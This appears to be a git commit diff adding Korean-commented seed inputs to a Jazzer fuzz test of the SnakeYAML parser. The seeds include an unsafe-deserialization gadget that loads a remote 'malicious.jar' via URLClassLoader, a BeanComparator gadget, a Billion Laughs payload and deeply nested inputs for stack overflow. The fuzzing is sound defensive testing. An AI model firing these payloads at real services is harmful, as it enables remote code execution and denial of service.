f4db08691988808c41480011b2cc3dc8da4253f6
SA JAEHEON <jls15900@gmail.com>
2026-03-25 19:41:51 +0900

    다양한 공격 유형 시드 추가

--- src/test/java/com/example/SnakeYamlFuzzTest.java
+++ src/test/java/com/example/SnakeYamlFuzzTest.java
@@ -14,29 +14,41 @@ class SnakeYamlFuzzTest {
     // 시드를 생성하는 메서드
     static Stream<Arguments> fuzzYamlParser() {
         return Stream.of(
-            arguments("&a [ *a ]") // 순환 참조 시드
+            // 1. 안전하지 않은 역직렬화 (RCE 타겟)
+            // SnakeYAML이 임의의 클래스를 인스턴스화하도록 유도
+            arguments("!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [\"http://localhost/malicious.jar\"] ]] ]"),
+            arguments("!!java.util.PriorityQueue\ncomparator: !!java.beans.BeanComparator { property: 'class' }\n"),
+
+            // 2. 순환 참조
+            arguments("&a [ *a ]"),
+
+            // 3. Billion Laughs 공격 (메모리 고갈 DoS)
+            // 파싱 시 객체가 기하급수적으로 늘어남
+            arguments("a: &a [\"lol\",\"lol\",\"lol\",\"lol\",\"lol\"]\n" +
+                      "b: &b [*a,*a,*a,*a,*a]\n" +
+                      "c: &c [*b,*b,*b,*b,*b]\n" +
+                      "d: &d [*c,*c,*c,*c,*c]"),
+
+            // 4. 깊은 중첩 구조 (StackOverflowError 유도)
+            arguments("[".repeat(5000) + "]".repeat(5000)),
+            arguments("{a: ".repeat(5000) + "1" + "}".repeat(5000))
         );
     }
 
     @MethodSource // 이 클래스와 같은 이름의 스태틱 메서드의 반환값을 시드로 입력받음
-    @FuzzTest // Jazzer 그레이박스 퍼징 실행
+    @FuzzTest(maxDuration = "10m") // Jazzer 그레이박스 퍼징 실행(최대 19분)
     void fuzzYamlParser(@NotNull String input) {
         try {
             Yaml yaml = new Yaml();
             Object parsed = yaml.load(input); 
             
-            // 핵심 트리거: 메모리에 올라간 객체를 순회하도록 강제합니다.
-            // 만약 순환 참조 객체라면, hashCode()나 toString()을 호출하는 순간 
-            // JVM이 무한 루프에 빠지며 StackOverflowError가 터집니다!
+            // JVM에 크래시를 유발하기 위해 SnakeYAML로 만든 객체에 대해 toString 호출
             if (parsed != null) {
                 parsed.toString();
             }
             
         } catch (Exception e) {
-            // YAMLException 뿐만 아니라 파싱 중 흔히 발생하는 모든 Java Exception을 무시합니다.
-            // 우리가 잡고자 하는 StackOverflowError나 OutOfMemoryError는 
-            // Exception이 아니라 'Error' 타입이므로 이 catch 블록을 무사히 통과하여 
-            // Jazzer에게 '크래시'로 정상 보고됩니다.
+            // 다른 예외는 모두 무시
         }
     }
 }
